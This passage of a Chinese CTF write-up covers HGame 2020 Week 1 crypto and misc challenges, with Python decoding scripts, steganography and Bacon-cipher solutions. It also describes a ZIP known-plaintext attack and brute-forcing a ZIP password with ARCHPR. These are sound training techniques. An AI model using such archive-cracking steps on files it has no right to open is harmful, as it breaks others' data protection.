+于是构造了一些字符然后拿到对应输出，计算得到映射表，解码那串奇怪的字符串拿到flag，具体代码如下。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">
+a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ! &#39;</span>
+b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ef2c601a54bd8739uvismghqlkrtonjpKLyICwxGBAHJEDzF! OYSMNWRQXZUTPV&#39;</span>
+
+m <span style="color:#f92672">=</span> dict()
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(a)):
+    j <span style="color:#f92672">=</span> b<span style="color:#f92672">.</span>find(a[i])
+    m[i] <span style="color:#f92672">=</span> j
+
+c <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pLaIjhg+{e5m$Umt!}Pnu3_imR0!ATeT&#39;</span>
+t <span style="color:#f92672">=</span> [None]<span style="color:#f92672">*</span>len(c)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(c)):
+    t[i] <span style="color:#f92672">=</span> c[m[i]]
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(t))
+
+</code></pre></div><h5 id="week1-crypto-ak">Week1 Crypto AK</h5>
+<h3 id="0x04-misc">0x04 Misc</h3>
+<h4 id="欢迎参加hgame">欢迎参加HGame！</h4>
+<p>这道题吧，刚开始是真没看出来是base64编码的。。
+然后还不屑于下面的<code>www.baidu.com</code>，想了半天无果，谷歌无果，无奈之下百度了，结果tmd还真有。。。
+提示说是base64编码的，于是解码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">import</span> base64
+c <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t&#39;</span>
+m <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(c<span style="color:#f92672">.</span>encode())
+<span style="color:#66d9ef">print</span>(m)
+<span style="color:#75715e">## b&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;</span>
+</code></pre></div><p>得到一串摩丝代码，然后想着在线解码，结果试了几个结果都不太一样，提交flag也出毛病。。。无奈之下又试了几次。。结果发现要全大写/吐血
+最后提交，通过。（签到题真难）</p>
+<h4 id="壁纸">壁纸</h4>
+<p>这题，开始解压zip包得到一张图
+<code>binwalk</code>一下
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%207.08.17%20PM.png" alt="Screen Shot 2020-01-17 at 7.08.17 P">
+然后得知图里有图本身和一个有flag.txt加密了的压缩包
+压缩包提示<code>Password is picture ID</code>。
+然后就到了这题最坑的地方了，我先是天真试了一下图片名解压，不行，那我就Stegsolve打开分析。。然后看到里面有图片的xml一些段，其中有一串ID。。我以为找到了，试了一下发现不行。。。
+前前后后试图揣测出题人本意硬是熬了快一天，，最后顶不住去问出题人。。。
+结果提醒我去百度<code>Pixiv搜图</code>找ID。。嘤。。。终于找到了（二次元盲落泪）
+最后终于成功解压，flag.txt里是一串unicode码，丢py里拿到flag
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%207.07.04%20PM.png" alt="Screen Shot 2020-01-17 at 7.07.04 P">
+（一点点吐槽，，这题跟unicode没多少关系啊呜呜呜）</p>
+<h4 id="克苏鲁神话">克苏鲁神话</h4>
+<p>解压得到一个加密压缩包和一个Bacon.txt，起初没想到怎么弄，后来查了一下古典密码才发现这是培根加密。
+写脚本解密</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">alphabet <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span>,<span style="color:#e6db74">&#39;i&#39;</span>,<span style="color:#e6db74">&#39;j&#39;</span>,<span style="color:#e6db74">&#39;k&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;m&#39;</span>,<span style="color:#e6db74">&#39;n&#39;</span>,<span style="color:#e6db74">&#39;o&#39;</span>,<span style="color:#e6db74">&#39;p&#39;</span>,<span style="color:#e6db74">&#39;q&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;s&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>,<span style="color:#e6db74">&#39;v&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>,<span style="color:#e6db74">&#39;x&#39;</span>,<span style="color:#e6db74">&#39;y&#39;</span>,<span style="color:#e6db74">&#39;z&#39;</span>)
+
+v1 <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;aaaaa&#34;</span>,<span style="color:#e6db74">&#34;aaaab&#34;</span>,<span style="color:#e6db74">&#34;aaaba&#34;</span>,<span style="color:#e6db74">&#34;aaabb&#34;</span>,<span style="color:#e6db74">&#34;aabaa&#34;</span>,<span style="color:#e6db74">&#34;aabab&#34;</span>,<span style="color:#e6db74">&#34;aabba&#34;</span>,<span style="color:#e6db74">&#34;aabbb&#34;</span>,<span style="color:#e6db74">&#34;abaaa&#34;</span>,<span style="color:#e6db74">&#34;abaab&#34;</span>,<span style="color:#e6db74">&#34;ababa&#34;</span>,<span style="color:#e6db74">&#34;ababb&#34;</span>,<span style="color:#e6db74">&#34;abbaa&#34;</span>,<span style="color:#e6db74">&#34;abbab&#34;</span>,<span style="color:#e6db74">&#34;abbba&#34;</span>,<span style="color:#e6db74">&#34;abbbb&#34;</span>,<span style="color:#e6db74">&#34;baaaa&#34;</span>,<span style="color:#e6db74">&#34;baaab&#34;</span>,<span style="color:#e6db74">&#34;baaba&#34;</span>,<span style="color:#e6db74">&#34;baabb&#34;</span>,<span style="color:#e6db74">&#34;babaa&#34;</span>,<span style="color:#e6db74">&#34;babab&#34;</span>,<span style="color:#e6db74">&#34;babba&#34;</span>,<span style="color:#e6db74">&#34;babbb&#34;</span>,<span style="color:#e6db74">&#34;bbaaa&#34;</span>,<span style="color:#e6db74">&#34;bbaab&#34;</span>)
+
+v2 <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;aaaaa&#34;</span>,<span style="color:#e6db74">&#34;aaaab&#34;</span>,<span style="color:#e6db74">&#34;aaaba&#34;</span>,<span style="color:#e6db74">&#34;aaabb&#34;</span>,<span style="color:#e6db74">&#34;aabaa&#34;</span>,<span style="color:#e6db74">&#34;aabab&#34;</span>,<span style="color:#e6db74">&#34;aabba&#34;</span>,<span style="color:#e6db74">&#34;aabbb&#34;</span>,<span style="color:#e6db74">&#34;abaaa&#34;</span>,<span style="color:#e6db74">&#34;abaaa&#34;</span>,<span style="color:#e6db74">&#34;abaab&#34;</span>,<span style="color:#e6db74">&#34;ababa&#34;</span>,<span style="color:#e6db74">&#34;ababb&#34;</span>,<span style="color:#e6db74">&#34;abbaa&#34;</span>,<span style="color:#e6db74">&#34;abbab&#34;</span>,<span style="color:#e6db74">&#34;abbba&#34;</span>,<span style="color:#e6db74">&#34;abbbb&#34;</span>,<span style="color:#e6db74">&#34;baaaa&#34;</span>,<span style="color:#e6db74">&#34;baaab&#34;</span>,<span style="color:#e6db74">&#34;baaba&#34;</span>,<span style="color:#e6db74">&#34;baabb&#34;</span>,<span style="color:#e6db74">&#34;baabb&#34;</span>,<span style="color:#e6db74">&#34;babaa&#34;</span>,<span style="color:#e6db74">&#34;babab&#34;</span>,<span style="color:#e6db74">&#34;babba&#34;</span>,<span style="color:#e6db74">&#34;babbb&#34;</span>)
+
+s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&#34;</span>
+
+s1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>isupper() <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)])
+s2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>isupper() <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)])
+
+<span style="color:#66d9ef">print</span>(s1, len(s1))
+<span style="color:#66d9ef">print</span>(s2, len(s2))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">d</span>(x, y):
+    <span style="color:#66d9ef">try</span>:
+        <span style="color:#66d9ef">return</span> alphabet[x<span style="color:#f92672">.</span>index(y)]
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;?&#39;</span>
+
+r1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+r2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+r3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+r4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s1)<span style="color:#f92672">//</span><span style="color:#ae81ff">5</span>):
+    d1 <span style="color:#f92672">=</span> s1[i<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span><span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>]
+    d2 <span style="color:#f92672">=</span> s2[i<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>:i<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span><span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>]
+    r1 <span style="color:#f92672">+=</span> d(v1, d1)
+    r2 <span style="color:#f92672">+=</span> d(v1, d2)
+    r3 <span style="color:#f92672">+=</span> d(v2, d1)
+    r4 <span style="color:#f92672">+=</span> d(v2, d2)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, r1, r1<span style="color:#f92672">.</span>upper())
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, r2, r2<span style="color:#f92672">.</span>upper())
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, r3, r3<span style="color:#f92672">.</span>upper())
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;*&#39;</span>, r4, r4<span style="color:#f92672">.</span>upper())
+</code></pre></div><p>得到</p>
+<pre><code>bbabababaabbbbbbbaabbbaaababbbbbbaabbbaabbabbbaabababbbbaababbbaabaaabbbbab 75
+aababababbaaaaaaabbaaabbbabaaaaaabbaaabbaabaaabbababaaaabbabaaabbabbbaaaaba 75
+* ?u?zyx???sxs?r? ?U?ZYX???SXS?R?
+* flaghiddenindoc FLAGHIDDENINDOC
+* ?w???z???tzt?s? ?W???Z???TZT?S?
+* fmaghiddeoiodpc FMAGHIDDEOIODPC
+</code></pre><p>然后我以为<code>FLAGHIDDENINDOC</code>这个就是密码，，结果大小写都试了也打不开压缩包。
+再研究了一下，发现压缩包里的也有Bacon.txt，和给的Bacon.txt有一样的CRC32校验值，那就zip明文攻击喽，同样的格式不带密码加密后丢进ARCHPR成功还原出不带密码压缩包。
+打开压缩包里的doc，提示密码，输入<code>FLAGHIDDENINDOC</code>，成功进入。
+瞄了一眼全是文字，没有flag，再去查了一下，原来还有隐藏文字选项，打开就找到了flag。
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%2011.24.41%20AM.png" alt="Screen Shot 2020-01-19 at 11.24.41 A"></p>
+<h4 id="签到题proplus">签到题ProPlus</h4>
+<p>先根据提示</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.
+
+JRFVJYFZVRUAGMAI
+
+
+* Three fenses first, Five Caesar next. English sentense first,  zip password next.
+</code></pre></div><p>三位栅栏，五位凯撒，解出上面的原话
+<img src="media/15792383134168/Screen%20Shot%202020-01-17%20at%209.38.43%20PM.png" alt="Screen Shot 2020-01-17 at 9.38.43 P">
+然后这里卡了我好久，迷之卡。。刚开始我没看懂<code>English sentense first,  zip password next.</code>的意思。。后来发现就是把下面的那一串也三位栅栏，五位凯撒就行了。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%2011.30.08%20AM.png" alt="Screen Shot 2020-01-19 at 11.30.08 A">
+拿到zip密码<code>EAVMUBAQHQMVEPDT</code>，打开压缩包。
+打开OK.txt之后是一坨Ook!，查了一下才知道Ook!也是编码。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%2012.15.22%20PM.png" alt="Screen Shot 2020-01-19 at 12.15.22 P">
+在线解码得到一串base32，python解base32得到另一串base64，再解base64发现时png图片，保存之后是二维码图。
+<img src="media/15792383134168/Screen%20Shot%202020-01-19%20at%2012.14.36%20PM.png" alt="Screen Shot 2020-01-19 at 12.14.36 P">
+然后简单粗暴拿iPhone扫了一下
+<img src="media/15792383134168/IMG_1973.jpg" alt="IMG_1973">
+拿到flag</p>
+<h4 id="每日推荐">每日推荐</h4>
+<p>压缩包打开，是Wireshark抓包文件，稍微分析一下，题目提到音乐，就干脆Wireshark里选择HTTP导出，大小从大到小排列，第一个研究了一下发现是个压缩包，导出保存。
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2011.24.25%20AM.png" alt="Screen Shot 2020-01-18 at 11.24.25 A">
+解压需要密码，7zip打开看提示说密码为六位数字，上ARCHPR爆破半分钟拿到密码。
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2011.23.35%20AM.png" alt="Screen Shot 2020-01-18 at 11.23.35 A">
+解压出一首歌，考虑是音频隐写，Audacity打开，一番乱试之后。。。
+<img src="media/15792383134168/Screen%20Shot%202020-01-18%20at%2011.23.09%20AM.png" alt="Screen Shot 2020-01-18 at 11.23.09 A">
+拿到flag。</p>
+<h5 id="week1-misc-ak">Week1 Misc AK</h5>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+    <span class="separator"><a class="tag" href="/tags/ctf/">CTF</a><a class="tag" href="/tags/hgame/">Hgame</a></span>
+
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+<script type="text/javascript" src="https://12x.me/js/jquery.min.js"></script>
+<script type="text/javascript" src="https://12x.me/js/jquery-migrate.min.js"></script>
+<script type="text/javascript" src="https://12x.me/js/jquery-appear.min.js"></script></html></body>
+
+</html>
